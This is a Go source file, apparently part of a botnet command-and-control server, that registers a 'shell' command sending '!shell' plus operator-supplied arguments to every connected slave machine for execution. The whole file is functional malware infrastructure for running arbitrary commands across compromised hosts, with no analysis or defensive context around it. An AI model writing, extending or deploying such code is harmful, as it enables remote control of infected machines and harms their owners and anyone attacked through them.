package all

import (
	"server/core/master/command"
	"server/core/master/session/sessions"
	"server/core/slave"
)

func init() {
	command.Register(&command.Command{
		Aliases:     []string{"shell", "cmd"},
		Description: "Shell cmd.",
		Admin:       false,
		Executor: func(args []string, session *sessions.Session) {
			if len(args) < 1 {
				session.Println("shell cmd")
				return
			}
			var msg string
			for i := 0; i < len(args); i++ {
				msg += args[i] + " "
			}
			slave.List.SendCommand("!shell " + msg)
			session.Println("Cmd sent.")
		},
	})
}
